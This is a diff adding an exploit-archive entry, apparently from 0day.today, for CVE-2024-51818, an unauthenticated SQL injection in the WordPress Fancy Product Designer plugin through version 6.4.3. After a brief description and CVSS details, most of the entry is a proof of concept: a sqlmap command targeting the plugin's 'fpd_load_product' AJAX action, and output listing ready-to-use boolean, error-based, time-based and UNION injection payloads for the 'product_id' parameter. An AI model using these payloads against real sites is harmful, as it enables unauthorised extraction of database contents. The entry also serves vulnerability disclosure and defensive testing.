@@ -1,0 +1,70 @@
+id: 39873
+date: 01/15/2025
+title: WordPress Fancy Product Designer 6.4.3 SQL Injection Vulnerability
+author: RandomRobbieBF
+cves: CVE-2024-51818
+
+# CVE-2024-51818
+Fancy Product Designer <= 6.4.3 - Unauthenticated SQL Injection
+
+# Description
+
+The Fancy Product Designer plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 6.4.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
+
+## Details
+
+- **Type**: plugin
+- **Slug**: fancy-product-designer
+- **Affected Version**: 6.4.3
+- **CVSS Score**: 7.5
+- **CVSS Rating**: High
+- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+- **CVE**: CVE-2024-51818
+- **Status**: Private
+
+POC
+---
+
+```
+
+$ python3 sqlmap -u 'https://wp-dev.ddev.site:443/wp-admin/admin-ajax.php' --data='action=fpd_load_product&product_id=1' --level=3 --text-only --dbms='MySQL'
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.1.2#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:59:32 /2025-01-09/
+
+[09:59:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: product_id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=fpd_load_product&product_id=1 AND 8091=8091
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=fpd_load_product&product_id=1 AND (SELECT 3963 FROM(SELECT COUNT(*),CONCAT(0x71626a7071,(SELECT (ELT(3963=3963,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=fpd_load_product&product_id=1 AND (SELECT 2808 FROM (SELECT(SLEEP(5)))CSPH)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: action=fpd_load_product&product_id=1 UNION ALL SELECT CONCAT(0x71626a7071,0x7544744f72516f7744634c4b63785867625066516a655578577270794441765a7350664d4c7a6c74,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[09:59:32] [INFO] testing MySQL
+[09:59:32] [WARNING] reflective value(s) found and filtering out
+[09:59:32] [INFO] confirming MySQL
+[09:59:32] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+```
+
+#  0day.today [2025-01-20]  #
